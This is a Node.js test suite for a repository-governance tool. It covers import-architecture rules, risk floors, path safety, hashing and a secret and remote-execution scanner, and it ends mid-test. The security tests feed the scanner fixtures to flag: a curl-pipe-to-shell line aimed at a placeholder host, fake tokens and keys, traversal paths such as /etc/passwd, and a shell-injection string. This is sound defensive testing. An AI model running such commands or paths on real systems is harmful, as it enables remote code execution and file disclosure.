import { test } from "node:test";
import { strict as assert } from "node:assert";
import {
  chmodSync,
  existsSync,
  linkSync,
  lstatSync,
  mkdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { join } from "node:path";
import {
  checkArchitecture,
  checkArchitectureGuard,
  architectureCoverage,
} from "../dist/core/architecture.js";
import {
  readConfig,
  readRiskPolicy,
  scanFeatures,
  effectiveRisk,
} from "../dist/core/config.js";
import { safePath, hashScope, walkFiles } from "../dist/core/files.js";
import { validate, schemaKinds } from "../dist/core/schema.js";
import { checkSecurity } from "../dist/core/security.js";
import { audit } from "../dist/core/audit.js";
import { validateWorkItem } from "../dist/core/work.js";
import { checkSkills } from "../dist/core/skills-check.js";
import { validatePlan } from "../dist/core/evidence.js";
import { doctor } from "../dist/core/doctor.js";
import { resolveCommand, runCommand } from "../dist/core/runner.js";
import childProcess, { spawnSync } from "node:child_process";
import { syncBuiltinESMExports } from "node:module";
import { pathToFileURL } from "node:url";
import { makeFixture, readJson, writeJson, invoke, cli } from "./helpers.mjs";

function fixture(t, level = 3) {
  const root = makeFixture(level);
  t.after(() => rmSync(root, { recursive: true, force: true }));
  return root;
}

// Observe actual entry identity before creating a distinct source spelling.
function prepareSourceSpelling(root, canonical, spelling) {
  const original = lstatSync(join(root, canonical), { bigint: true });
  let candidate;
  try {
    candidate = lstatSync(join(root, spelling), { bigint: true });
  } catch (error) {
    if (error.code !== "ENOENT") throw error;
    if (original.isDirectory()) {
      mkdirSync(join(root, spelling), { recursive: true });
    } else {
      mkdirSync(join(root, spelling, ".."), { recursive: true });
      writeFileSync(join(root, spelling), "export const distinct = true;\n");
    }
    candidate = lstatSync(join(root, spelling), { bigint: true });
  }
  return original.dev === candidate.dev && original.ino === candidate.ino;
}

const inheritedTargets = [
  "toString",
  "constructor",
  "hasOwnProperty",
  "valueOf",
  "isPrototypeOf",
  "propertyIsEnumerable",
  "toLocaleString",
  "__proto__",
];

test("Feature Maps require own configured targets while explicit built-in names remain valid", (t) => {
  for (const target of [...inheritedTargets, "not-configured"]) {
    const root = fixture(t);
    const map = readJson(root, "docs/features/greeting.json");
    map.verification.target = target;
    writeJson(root, "docs/features/greeting.json", map);
    assert.match(
      scanFeatures(root).errors.join("; "),
      new RegExp(`unconfigured verification target ${target}`),
    );
    // __proto__ is outside the existing configured-name grammar.
    if (target === "__proto__") continue;
    const config = readJson(root, "arrs.json");
    Object.defineProperty(config.verifyTargets, target, {
      value: { argv: [process.execPath, "verify.mjs"] },
      enumerable: true,
    });
    writeJson(root, "arrs.json", config);
    assert.deepEqual(scanFeatures(root).errors, []);
  }
});

test("shared and generated runners distinguish missing inherited targets and preserve owned literal commands", async (t) => {
  const root = fixture(t);
  for (const target of [...inheritedTargets, "not-configured"]) {
    assert.throws(
      () => resolveCommand(readConfig(root), "verify", target),
      new RegExp(`Configure verifyTargets\\.${target}`),
    );
    const result = spawnSync(process.execPath, ["repo", "verify", target], {
      cwd: root,
      encoding: "utf8",
    });
    assert.equal(result.status, 1);
    assert.match(result.stderr, new RegExp(`Configure verifyTargets\\.${target}`));
  }
  const ordinary = spawnSync(process.execPath, ["repo", "verify", "greet"], {
    cwd: root,
    encoding: "utf8",
  });
  assert.equal(ordinary.status, 0, ordinary.stderr);
  const literal = "$HOME $(echo literal); & value";
  for (const target of ["toString", "constructor", "hasOwnProperty", "literal-check"]) {
    const config = readJson(root, "arrs.json");
    Object.defineProperty(config.verifyTargets, target, {
      value: {
        argv: [
          process.execPath,
          "-e",
          "console.log(JSON.stringify(process.argv.slice(1)));process.exit(7)",
          literal,
        ],
      },
      enumerable: true,
    });
    writeJson(root, "arrs.json", config);
    const shared = await runCommand(
      root,
      resolveCommand(readConfig(root), "verify", target),
    );
    assert.equal(shared.exitCode, 7);
    assert.deepEqual(JSON.parse(shared.stdout), [literal]);
    const generated = spawnSync(process.execPath, ["repo", "verify", target], {
      cwd: root,
      encoding: "utf8",
    });
    assert.equal(generated.status, 7, generated.stderr);
    assert.deepEqual(JSON.parse(generated.stdout), [literal]);
    const cliResult = invoke(root, ["run", "verify", target]);
    assert.equal(cliResult.status, 7, cliResult.stdout);
    assert.deepEqual(JSON.parse(JSON.parse(cliResult.stdout).stdout), [literal]);
  }
});

test("all versioned schemas reject unsupported versions and unknown fields", (t) => {
  const root = fixture(t);
  const config = readConfig(root);
  assert.deepEqual(validate("config", config), []);
  assert.ok(validate("config", { ...config, hiddenCommand: "arbitrary" }).length);
  for (const kind of schemaKinds) {
    const unsupported =
      kind === "receipt-statement"
        ? {
            _type: "https://in-toto.io/Statement/v1",
            predicateType: "https://arrs.dev/predicates/trusted-receipt/v1",
            predicate: { schemaVersion: "1.0" },
          }
        : { schemaVersion: "1.0" };
    const versionPath =
      kind === "receipt-statement" ? "/predicate/schemaVersion" : "/schemaVersion";
    assert.ok(
      validate(kind, unsupported).some(
        (error) => error.startsWith(versionPath + " ") && /constant/.test(error),
      ),
      kind,
    );
  }
  const feature = readJson(root, "docs/features/greeting.json");
  assert.deepEqual(validate("feature", feature), []);
  const plan = readJson(root, "proof-plan.json");
  assert.deepEqual(validate("proof-plan", plan), []);
  plan.steps[0].expectExitCode = -1;
  assert.ok(validate("proof-plan", plan).length);
});

test("repository references fail closed on traversal, absolute paths and symlinks", (t) => {
  const root = fixture(t);
  for (const path of [
    "../outside",
    "/etc/passwd",
    "src/../../outside",
    "C:/outside",
    "src\\outside",
    "",
  ])
    assert.throws(() => safePath(root, path), /path|relative|Unsafe/);
  symlinkSync(
    root,
    join(root, "escape"),
    process.platform === "win32" ? "junction" : "dir",
  );
  assert.throws(() => safePath(root, "escape/child.json"), /Symlink/);
  const config = readJson(root, "arrs.json");
  config.skills.path = "escape/skills";
  writeJson(root, "arrs.json", config);
  assert.throws(() => readConfig(root), /Symlink/);
});

test("configuration permits actionable unconfigured commands but separates generated evidence", (t) => {
  const root = fixture(t);
  const config = readJson(root, "arrs.json");
  config.commands = {};
  writeJson(root, "arrs.json", config);
  assert.deepEqual(readConfig(root).commands, {});
  config.proof.evidenceDir = "src/evidence";
  writeJson(root, "arrs.json", config);
  assert.throws(() => readConfig(root), /\.arrs/);
});

test("Feature Maps reject stale paths, unknown targets, invalid sensitivity and duplicate IDs", (t) => {
  const root = fixture(t);
  assert.deepEqual(scanFeatures(root).errors, []);
  const map = readJson(root, "docs/features/greeting.json");
  map.implementation.push("src/missing");
  writeJson(root, "docs/features/greeting.json", map);
  assert.match(scanFeatures(root).errors.join(";"), /does not exist/);
  map.implementation.pop();
  map.verification.target = "missing";
  writeJson(root, "docs/features/greeting.json", map);
  assert.match(scanFeatures(root).errors.join(";"), /unconfigured verification/);
  map.verification.target = "greet";
  map.sensitivity = "sensitive";
  writeJson(root, "docs/features/greeting.json", map);
  assert.match(scanFeatures(root).errors.join(";"), /at least R3/);
  map.sensitivity = "none";
  writeJson(root, "docs/features/greeting.json", map);
  writeJson(root, "docs/features/duplicate.json", map);
  assert.match(scanFeatures(root).errors.join(";"), /Duplicate Feature Map/);
});

test("TS/JS adapter accepts real canonical imports and rejects forbidden/private/unresolved/computed imports", (t) => {
  const root = fixture(t);
  assert.deepEqual(checkArchitecture(root), []);
  assert.deepEqual(checkArchitectureGuard(root), []);
  const domain = join(root, "src/domain/invalid.mjs");
  writeFileSync(domain, "export * from '../application/main.mjs';\n");
  assert.match(checkArchitecture(root).join(";"), /domain cannot depend on application/);
  rmSync(domain);
  writeFileSync(join(root, "src/domain/private.mjs"), "export const secretDetail = 1;\n");
  const application = join(root, "src/application/invalid.mjs");
  writeFileSync(application, "import '../domain/private.mjs';\n");
  assert.match(checkArchitecture(root).join(";"), /bypasses public/);
  writeFileSync(application, "const p = '../domain/greeting.mjs'; await import(p);\n");
  assert.match(checkArchitecture(root).join(";"), /computed import/);
  writeFileSync(application, "require('../domain/missing.mjs');\n");
  assert.match(checkArchitecture(root).join(";"), /unresolved local/);
  writeFileSync(application, "require('../../verify.mjs');\n");
  assert.match(checkArchitecture(root).join(";"), /outside declared modules/);
});

test("TypeScript adapter resolves ESM .js specifiers to TypeScript and refuses inherited path aliases", (t) => {
  const root = fixture(t);
  writeFileSync(
    join(root, "src/domain/model.ts"),
    "export interface Name { value: string }\n",
  );
  writeFileSync(
    join(root, "src/application/types.ts"),
    "import type {Name} from '../domain/model.js';\nexport const getName = (name: Name): string => name.value;\n",
  );
  const policy = readJson(root, ".agent/policies/architecture.json");
  policy.modules[0].public.push("src/domain/model.ts");
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.deepEqual(checkArchitecture(root), []);
  writeJson(root, "base-tsconfig.json", {
    compilerOptions: { baseUrl: ".", paths: { "@domain/*": ["src/domain/*"] } },
  });
  writeJson(root, "tsconfig.json", { extends: "./base-tsconfig.json" });
  assert.match(checkArchitecture(root).join(";"), /paths\/baseUrl are unsupported/);
});

test("declaration-only modules do not crash scanner, and guard cannot award unconstrained policies", (t) => {
  const root = fixture(t);
  writeFileSync(
    join(root, "src/domain/public.d.cts"),
    "declare const value: number; export = value;\n",
  );
  assert.deepEqual(checkArchitecture(root), []);
  const policy = readJson(root, ".agent/policies/architecture.json");
  policy.modules[0].allows = ["application"];
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitectureGuard(root).join(";"), /no executable forbidden/);
});

test("policy risk floors follow filesystem aliases and preserve distinct source entries", (t) => {
  const root = fixture(t);
  const map = readJson(root, "docs/features/greeting.json");
  map.risk = "R0";
  writeJson(root, "docs/features/greeting.json", map);
  const policy = readJson(root, ".agent/policies/risk.json");
  policy.sensitivePaths = [
    { path: "src/domain", risk: "R3", reason: "Protected source directory." },
    {
      path: "src/domain/greeting.mjs",
      risk: "R4",
      reason: "The overlapping source file has the greatest floor.",
    },
  ];
  writeJson(root, ".agent/policies/risk.json", policy);
  for (const spelling of ["SRC/DOMAIN", "src/DOMAIN", "ſrc/domain", "src/domaın"]) {
    const identical = prepareSourceSpelling(root, "src/domain", spelling);
    if (!identical)
      writeFileSync(
        join(root, spelling, "greeting.mjs"),
        "export const distinct = true;\n",
      );
    assert.equal(
      effectiveRisk(root, [spelling], "R0"),
      identical ? "R4" : "R0",
      spelling,
    );
    assert.equal(
      effectiveRisk(root, [`./${spelling}//./greeting.mjs`], "R0"),
      identical ? "R4" : "R0",
      `${spelling} normalized child`,
    );
    assert.equal(
      effectiveRisk(root, [`${spelling}/pending/new.mjs`], "R0"),
      identical ? "R3" : "R0",
      `${spelling} missing descendant`,
    );
    assert.equal(
      effectiveRisk(root, [spelling], "R4"),
      "R4",
      `${spelling} requested floor`,
    );
  }
  const parentAlias = prepareSourceSpelling(root, "src", "SRC");
  assert.equal(effectiveRisk(root, ["./SRC//"], "R0"), parentAlias ? "R4" : "R0");
  assert.equal(effectiveRisk(root, ["src/domain-old/new.mjs"], "R0"), "R0");
  assert.equal(effectiveRisk(root, ["README.md"], "R0"), "R0");
});

test("Feature Map implementation and entrypoint risk floors follow filesystem aliases", (t) => {
  const root = fixture(t);
  const policy = readJson(root, ".agent/policies/risk.json");
  policy.sensitivePaths = [];
  writeJson(root, ".agent/policies/risk.json", policy);
  const map = readJson(root, "docs/features/greeting.json");
  map.implementation = ["src/domain/greeting.mjs"];
  map.entryPoints = ["src/application/main.mjs"];
  map.risk = "R3";
  map.sensitivity = "sensitive";
  writeJson(root, "docs/features/greeting.json", map);
  for (const [canonical, spellings] of [
    [
      "src/domain/greeting.mjs",
      ["SRC/DOMAIN/GREETING.MJS", "ſrc/domain/greeting.mjs", "src/domain/greetıng.mjs"],
    ],
    [
      "src/application/main.mjs",
      [
        "SRC/APPLICATION/MAIN.MJS",
        "ſrc/application/main.mjs",
        "src/application/maın.mjs",
      ],
    ],
  ]) {
    for (const spelling of spellings) {
      const identical = prepareSourceSpelling(root, canonical, spelling);
      assert.equal(
        effectiveRisk(root, [spelling], "R0"),
        identical ? "R3" : "R0",
        spelling,
      );
      assert.equal(
        effectiveRisk(root, [`./${spelling}//.`], "R0"),
        identical ? "R3" : "R0",
        `${spelling} normalized`,
      );
      assert.equal(
        effectiveRisk(root, [spelling], "R4"),
        "R4",
        `${spelling} requested floor`,
      );
    }
  }
  const domainAlias = prepareSourceSpelling(root, "src/domain", "SRC/DOMAIN");
  assert.equal(effectiveRisk(root, ["SRC/DOMAIN"], "R0"), domainAlias ? "R3" : "R0");
  assert.equal(effectiveRisk(root, ["src/domain/unrelated.mjs"], "R0"), "R0");
  policy.sensitivePaths = [
    { path: "src/domain", risk: "R4", reason: "Maximum configured floor applies." },
  ];
  writeJson(root, ".agent/policies/risk.json", policy);
  assert.equal(
    effectiveRisk(root, ["SRC/DOMAIN", "src/application/main.mjs"], "R0"),
    domainAlias ? "R4" : "R3",
  );
});

test("risk aliases retain missing-path floors, hardlink identity and source path safety", (t) => {
  const root = fixture(t);
  const map = readJson(root, "docs/features/greeting.json");
  map.risk = "R0";
  writeJson(root, "docs/features/greeting.json", map);
  const policy = readJson(root, ".agent/policies/risk.json");
  policy.sensitivePaths = [
    {
      path: "src/domain/future/contract.mjs",
      risk: "R3",
      reason: "A proposed source contract keeps its floor before creation.",
    },
    {
      path: "src/domain/greeting.mjs",
      risk: "R3",
      reason: "Existing source identity is protected.",
    },
  ];
  writeJson(root, ".agent/policies/risk.json", policy);
  const identical = prepareSourceSpelling(root, "src/domain", "SRC/DOMAIN");
  assert.equal(
    effectiveRisk(root, ["./SRC//DOMAIN/future/contract.mjs"], "R0"),
    identical ? "R3" : "R0",
  );
  assert.equal(effectiveRisk(root, ["src/domain/future/contract.mjs"], "R0"), "R3");
  assert.equal(effectiveRisk(root, ["src/domain/future/unrelated.mjs"], "R0"), "R0");
  linkSync(join(root, "src/domain/greeting.mjs"), join(root, "shared-source.mjs"));
  assert.equal(effectiveRisk(root, ["shared-source.mjs"], "R0"), "R3");
  symlinkSync(join(root, "src/domain/greeting.mjs"), join(root, "source-link.mjs"));
  symlinkSync(join(root, "src/domain"), join(root, "source-directory-link"), "dir");
  for (const scope of ["source-link.mjs", "source-directory-link/greeting.mjs"])
    assert.throws(() => effectiveRisk(root, [scope], "R0"), /Symlink repository paths/);
  assert.throws(
    () => effectiveRisk(root, ["src/../domain"], "R0"),
    /cannot contain '\.\.'/,
  );
});

test("risk floors follow normalized scope and parent directories and reject unsafe R3/R4 policies", (t) => {
  const root = fixture(t);
  const policy = readJson(root, ".agent/policies/risk.json");
  policy.sensitivePaths = [
    {
      path: "./src/domain/greeting.mjs",
      risk: "R3",
      reason: "A public behavioral contract requires independent review.",
    },
  ];
  writeJson(root, ".agent/policies/risk.json", policy);
  assert.equal(effectiveRisk(root, ["./src/domain"], "R0"), "R3");
  assert.equal(effectiveRisk(root, ["src/./domain/greeting.mjs"], "R1"), "R3");
  assert.equal(effectiveRisk(root, ["src/application/main.mjs"], "R0"), "R1");
  policy.classes.R3.autonomy = "unattended";
  writeJson(root, ".agent/policies/risk.json", policy);
  assert.throws(() => readRiskPolicy(root), /cannot allow unattended/);
  policy.classes.R3.autonomy = "review";
  policy.classes.R4.humanApproval = false;
  writeJson(root, ".agent/policies/risk.json", policy);
  assert.throws(() => readRiskPolicy(root), /R4 must require/);
});

test("content hashes bind source directories but exclude generated evidence", (t) => {
  const root = fixture(t);
  const original = hashScope(root, "src");
  mkdirSync(join(root, ".arrs/evidence"), { recursive: true });
  writeFileSync(join(root, ".arrs/evidence/log.json"), "{}");
  assert.equal(hashScope(root, "src"), original);
  writeFileSync(
    join(root, "src/domain/greeting.mjs"),
    readFileSync(join(root, "src/domain/greeting.mjs"), "utf8") + "// changed\n",
  );
  assert.notEqual(hashScope(root, "src"), original);
});

test("source scope hashing ignores unrelated root dependency symlinks", (t) => {
  const root = fixture(t);
  const original = hashScope(root, "src/domain");
  const fileHash = hashScope(root, "src/domain/greeting.mjs");
  const dependencies = join(root, "shared-dependencies");
  mkdirSync(dependencies);
  writeFileSync(join(dependencies, "dependency.mjs"), "export const value = 1;\n");
  const rootHash = hashScope(root, ".");
  const link = join(root, "node_modules");
  symlinkSync(dependencies, link, process.platform === "win32" ? "junction" : "dir");
  assert.equal(lstatSync(link).isSymbolicLink(), true);
  assert.equal(hashScope(root, "src/domain"), original);
  assert.equal(hashScope(root, "."), rootHash);
  assert.equal(hashScope(root, "src/domain/greeting.mjs"), fileHash);
  assert.throws(
    () =>
      walkFiles(root, "src/domain", {
        includeIgnored: true,
        excludedPaths: [".git", ".arrs", "node_modules"],
        maxFiles: 0,
      }),
    /Too many files/,
  );
  assert.throws(
    () => walkFiles(root, "src/domain", { excludedPaths: ["../outside"] }),
    /cannot contain '\.\.'/,
  );
  writeFileSync(
    join(root, "src/domain/greeting.mjs"),
    readFileSync(join(root, "src/domain/greeting.mjs"), "utf8") + "// changed\n",
  );
  assert.notEqual(hashScope(root, "src/domain"), original);
});

test("declared source under reserved directory names is checked and hashed", (t) => {
  const root = fixture(t);
  for (const name of [
    "build",
    "vendor",
    "dist",
    "coverage",
    ".next",
    "node_modules",
    ".arrs",
    ".git",
  ]) {
    mkdirSync(join(root, `src/domain/${name}`));
    const file = join(root, `src/domain/${name}/invalid.mjs`);
    writeFileSync(file, "import '../../application/main.mjs';\n");
    assert.match(
      checkArchitecture(root).join(";"),
      /domain cannot depend on application/,
      name,
    );
    const before = hashScope(root, "src/domain");
    writeFileSync(
      file,
      "import '../../application/main.mjs';\nconsole.log('changed');\n",
    );
    assert.notEqual(hashScope(root, "src/domain"), before, name);
    rmSync(join(root, `src/domain/${name}`), { recursive: true });
  }
  assert.deepEqual(checkArchitectureGuard(root), []);
});

test("most-specific ownership excludes generated modules and checks handwritten descendants", (t) => {
  const root = fixture(t);
  mkdirSync(join(root, "src/domain/generated/manual"), { recursive: true });
  writeFileSync(
    join(root, "src/domain/generated/client.mjs"),
    "import '../../application/main.mjs';\n",
  );
  const policy = readJson(root, ".agent/policies/architecture.json");
  policy.modules.push({
    id: "generated",
    path: "src/domain/generated",
    allows: [],
    public: ["src/domain/generated/client.mjs"],
    generated: true,
  });
  policy.modules[0].path = "./src/././././domain/././././";
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.deepEqual(checkArchitecture(root), []);
  writeFileSync(
    join(root, "src/domain/sibling.mjs"),
    "import '../application/main.mjs';\n",
  );
  assert.match(checkArchitecture(root).join(";"), /domain cannot depend on application/);
  rmSync(join(root, "src/domain/sibling.mjs"));
  writeFileSync(
    join(root, "src/domain/generated/manual/source.mjs"),
    "import '../../../application/main.mjs';\n",
  );
  policy.modules.push({
    id: "manual",
    path: "src/domain/generated/manual",
    allows: [],
    public: ["src/domain/generated/manual/source.mjs"],
  });
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitecture(root).join(";"), /manual cannot depend on application/);
});

test("mutation guard discovers reserved-name source and excludes generated candidates", (t) => {
  const root = fixture(t);
  const policy = readJson(root, ".agent/policies/architecture.json");
  for (const module of policy.modules) {
    mkdirSync(join(root, `${module.path}/build`));
    const file = module.public[0];
    const text = readFileSync(join(root, file), "utf8");
    const relocated = `${module.path}/build/${file.split("/").at(-1)}`;
    writeFileSync(
      join(root, relocated),
      text.replace("../domain/greeting.mjs", "../../domain/build/greeting.mjs"),
    );
    rmSync(join(root, file));
    module.public = [relocated];
  }
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.deepEqual(checkArchitecture(root), []);
  assert.deepEqual(checkArchitectureGuard(root), []);
  policy.modules[1].generated = true;
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitectureGuard(root).join(";"), /no executable forbidden/);
});

test("scope hashing excludes only root metadata and evidence and rejects nested symlinks", (t) => {
  const root = fixture(t);
  const original = hashScope(root, ".");
  for (const directory of [".arrs", ".git", "node_modules"]) {
    mkdirSync(join(root, directory), { recursive: true });
    writeFileSync(join(root, directory, "output.json"), "{}");
  }
  assert.equal(hashScope(root, "."), original);
  mkdirSync(join(root, "src/domain/build"));
  symlinkSync(
    root,
    join(root, "src/domain/build/link"),
    process.platform === "win32" ? "junction" : "dir",
  );
  assert.throws(() => hashScope(root, "src/domain"), /Symlink/);
  assert.match(checkArchitecture(root).join(";"), /Symlink/);
});

test("security guards secret tokens, scoped expiring suppressions, remote execution and dependency justification", (t) => {
  const root = fixture(t);
  assert.deepEqual(checkSecurity(root), []);
  const path = "src/domain/unsafe.mjs";
  writeFileSync(
    join(root, path),
    'export const leaked = "' + "ghp_" + "a".repeat(36) + '";\n',
  );
  assert.match(checkSecurity(root).join(";"), /suspected credential/);
  writeFileSync(join(root, path), "// @" + "ts-ignore\nexport const value = 1;\n");
  assert.match(checkSecurity(root).join(";"), /unapproved compiler/);
  const exceptions = readJson(root, ".agent/policies/exceptions.json");
  exceptions.exceptions = [
    {
      path,
      rule: "suppression",
      match: "@" + "ts-ignore",
      reason: "Temporary compatibility shim awaiting upstream type correction.",
      expires: "2099-12-31",
      approvedBy: "independent reviewer",
    },
  ];
  writeJson(root, ".agent/policies/exceptions.json", exceptions);
  assert.deepEqual(checkSecurity(root), []);
  exceptions.exceptions[0].expires = "2000-01-01";
  writeJson(root, ".agent/policies/exceptions.json", exceptions);
  assert.match(checkSecurity(root).join(";"), /expired/);
  exceptions.exceptions = [];
  writeJson(root, ".agent/policies/exceptions.json", exceptions);
  writeFileSync(
    join(root, path),
    "// curl " + "https://example.invalid/script | " + "sh\n",
  );
  assert.match(checkSecurity(root).join(";"), /download-to-shell/);
  rmSync(join(root, path));
  writeJson(root, "package.json", { dependencies: { fictional: "1.0.0" } });
  assert.match(checkSecurity(root).join(";"), /no recorded justification/);
  exceptions.dependencies = [
    {
      name: "fictional",
      reason: "A bounded serializer implementation required by this fixture.",
    },
  ];
  writeJson(root, ".agent/policies/exceptions.json", exceptions);
  assert.deepEqual(checkSecurity(root), []);
});

test("doctor reports unavailable tools without executing project commands", async (t) => {
  const root = fixture(t);
  const config = readJson(root, "arrs.json");
  config.commands.check.argv = ["arrs-no-such-tool-928174"];
  writeJson(root, "arrs.json", config);
  const report = await doctor(root);
  assert.equal(report.healthy, false);
  assert.ok(report.checks.some((check) => check.id === "command:check" && !check.passed));
  assert.ok(report.checks.some((check) => check.id === "features" && check.passed));
});

test("behavioral acceptance cannot be assigned to unrelated unit/static checks", (t) => {
  const root = fixture(t);
  const plan = readJson(root, "proof-plan.json");
  plan.steps[0].criterion = plan.acceptance[0];
  delete plan.steps.at(-1).criterion;
  assert.match(
    validatePlan(root, plan).join(";"),
    /Acceptance criterion has no successful verification/,
  );
  plan.category = "docs";
  plan.risk = "R0";
  // Domain feature classification still floors this source scope at R1.
  assert.match(validatePlan(root, plan).join(";"), /risk is below/);
});

test("architecture fails closed on createRequire and require aliases", (t) => {
  const root = fixture(t);
  const path = join(root, "src/domain/loader.mjs");
  writeFileSync(
    path,
    "import {createRequire as cr} from 'node:module'; const req = cr(import.meta.url); req('../application/main.mjs');\n",
  );
  assert.match(checkArchitecture(root).join(";"), /computed import\/require/);
  writeFileSync(path, "const loader = require; loader('../application/main.mjs');\n");
  assert.match(checkArchitecture(root).join(";"), /computed import\/require/);
  writeFileSync(path, "module.require('../application/main.mjs');\n");
  assert.match(checkArchitecture(root).join(";"), /computed import\/require/);
});

test("CI rejects disabled gate jobs/steps and accepts only artifact always conditions", async (t) => {
  const root = fixture(t, 4);
  const path = join(root, ".github/workflows/ci.yml");
  const workflow = readFileSync(path, "utf8");
  const ci = async () =>
    (await audit(root)).controls.find((control) => control.id === "ci");
  assert.equal((await ci()).passed, true);
  writeFileSync(path, workflow.replace("    runs-on:", "    if: false\n    runs-on:"));
  assert.equal((await ci()).passed, false);
  writeFileSync(
    path,
    workflow.replace(
      "      - run: ./repo test",
      "      - run: ./repo test\n        if: false",
    ),
  );
  assert.equal((await ci()).passed, false);
  writeFileSync(
    path,
    workflow +
      "      - uses: actions/upload-artifact@v4\n        if: always()\n        with:\n          path: .arrs/evidence/\n",
  );
  assert.equal((await ci()).passed, true);
});

test("skill audit accepts deliberate version evolution and detects source bundle/license corruption", (t) => {
  const root = fixture(t, 4);
  assert.deepEqual(checkSkills(root), []);
  const base = readConfig(root).skills.path;
  const provenance = readJson(root, `${base}/provenance.json`);
  const id = Object.keys(provenance.adaptations).find(
    (id) => provenance.adaptations[id].sourceRevision,
  );
  provenance.adaptations[id].adaptationVersion = "0.1.1";
  writeJson(root, `${base}/provenance.json`, provenance);
  assert.deepEqual(checkSkills(root), []);
  const first = Object.keys(provenance.adaptations[id].sourceHashes)[0];
  provenance.adaptations[id].sourceHashes[first] = "a".repeat(64);
  writeJson(root, `${base}/provenance.json`, provenance);
  assert.match(checkSkills(root).join(";"), /source bundle/);
  provenance.adaptations[id].sourceHashes[first] = readJson(
    root,
    `${base}/manifest.json`,
  ).files[first];
  writeJson(root, `${base}/provenance.json`, provenance);
  writeFileSync(
    join(root, `${base}/UPSTREAM-LICENSE`),
    readFileSync(join(root, `${base}/UPSTREAM-LICENSE`), "utf8") + "\nmodified notice",
  );
  assert.match(checkSkills(root).join(";"), /exact pinned upstream/);
});

test("work completion binds current feature risks, category, acceptance and every behavioral target", (t) => {
  const root = fixture(t);
  const result = invoke(root, ["proof", "run", "proof-plan.json", "--execute"]);
  assert.equal(result.status, 0, result.stdout + result.stderr);
  const proof = JSON.parse(result.stdout);
  const item = {
    schemaVersion: "0.1",
    id: "greeting-feature",
    title: "The greeting capability passes its acceptance",
    state: "ready-for-review",
    risk: "R1",
    category: "feature",
    featureIds: ["greeting"],
    acceptance: ["Greets a trimmed name"],
    context: ["docs/features/greeting.json", "src/domain"],
    verificationTargets: ["greet"],
    dependencies: [],
    decisions: [],
    proof: proof.path,
  };
  assert.deepEqual(validateWorkItem(root, item), []);
  item.category = "bug";
  assert.match(validateWorkItem(root, item).join(";"), /category mismatch/);
  item.category = "feature";
  item.acceptance = ["Rejects malicious and blank inputs"];
  assert.match(validateWorkItem(root, item).join(";"), /acceptance lacks/);
  item.acceptance = ["Greets a trimmed name"];
  const config = readJson(root, "arrs.json");
  config.verifyTargets.other = config.verifyTargets.greet;
  writeJson(root, "arrs.json", config);
  item.verificationTargets.push("other");
  assert.match(validateWorkItem(root, item).join(";"), /target lacks/);
  item.verificationTargets = ["greet"];
  const map = readJson(root, "docs/features/greeting.json");
  map.risk = "R3";
  writeJson(root, "docs/features/greeting.json", map);
  assert.match(validateWorkItem(root, item).join(";"), /below feature/);
  item.risk = "R4";
  item.state = "ready-for-agent";
  item.review = {
    independent: "Independent review of planned work",
    humanApproval: "A human approved controlled manual work",
  };
  assert.match(validateWorkItem(root, item).join(";"), /R4 cannot be ready/);
});

test("doctor validates configured setup and development tooling as well as verification commands", async () => {
  const root = makeFixture();
  try {
    const config = JSON.parse(readFileSync(join(root, "arrs.json"), "utf8"));
    config.commands.setup = { argv: ["missing-arrs-bootstrap-tool"] };
    writeFileSync(join(root, "arrs.json"), JSON.stringify(config));
    const report = await doctor(root);
    assert.ok(
      report.checks.some((check) => check.id === "command:setup" && !check.passed),
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("security scans root and nested dotenv suffix variants with the same bounded secret rules", (t) => {
  const root = fixture(t);
  for (const directory of ["", "config/"]) {
    mkdirSync(join(root, directory), { recursive: true });
    for (const name of [".env", ".env.local", ".env.production", ".env.test.local"]) {
      const path = directory + name;
      writeFileSync(join(root, path), "KEY=" + "AK" + "IA" + "A".repeat(16));
      assert.match(checkSecurity(root).join(";"), /suspected credential/, path);
      writeFileSync(
        join(root, path),
        "-----BEGIN " + "RSA " + "PRIVATE KEY-----\nfixture\n",
      );
      assert.match(checkSecurity(root).join(";"), /suspected credential/, path);
      writeFileSync(join(root, path), "API_KEY='example-placeholder'\n");
      assert.equal(
        checkSecurity(root).some((error) => error.startsWith(path + ":")),
        false,
      );
      rmSync(join(root, path));
    }
  }
  writeFileSync(join(root, ".env.production"), "x".repeat(2_000_001));
  assert.match(checkSecurity(root).join(";"), /security scan text exceeds 2 MB/);
  rmSync(join(root, ".env.production"));
  mkdirSync(join(root, "build"));
  writeFileSync(
    join(root, "build/.env.production"),
    "KEY=" + "AK" + "IA" + "A".repeat(16),
  );
  assert.equal(
    checkSecurity(root).some((error) => error.includes("build/.env.production")),
    false,
  );
});

test("proof scope admission rejects normalized output roots and preserves legitimate aliases", (t) => {
  const root = fixture(t);
  for (const name of [".arrs", ".git", "node_modules"]) {
    mkdirSync(join(root, name, "child"), { recursive: true });
    writeFileSync(join(root, name, "child/source.mjs"), "export const value = 1;\n");
  }
  const plan = readJson(root, "proof-plan.json");
  plan.risk = "R3";
  plan.authorization = {
    humanApproval: "Fixture authorization for source-scope contract tests",
  };
  const prohibited = [
    ".",
    "./",
    "./.",
    "././",
    ".//",
    "././.",
    ".arrs",
    "./.arrs",
    "././.arrs//",
    ".arrs/./child",
    ".arrs//child/source.mjs",
    ".git",
    "./.git",
    "././.git//",
    ".git/./child",
    ".git//child/source.mjs",
    "node_modules",
    "./node_modules",
    "././node_modules//",
    "node_modules/./child",
    "node_modules//child/source.mjs",
  ];
  for (const path of prohibited) {
    const errors = validatePlan(root, { ...plan, scope: [path] });
    assert.ok(
      errors.some(
        (error) => error.includes(path) && /scope must refer to source paths/.test(error),
      ),
      `${path}: ${errors.join("; ")}`,
    );
  }
  for (const [reserved, spellings] of [
    [".git", [".GIT", ".GiT", ".gıt", ".GıT"]],
    [".arrs", [".ARRS", ".ArRs", ".arrſ", ".ARRſ"]],
    ["node_modules", ["NODE_MODULES", "Node_Modules", "node_moduleſ", "NODE_MODULEſ"]],
  ]) {
    const reservedStat = lstatSync(join(root, reserved), { bigint: true });
    assert.ok(reservedStat.isDirectory(), reserved);
    for (const spelling of spellings) {
      let aliasesReserved = false;
      try {
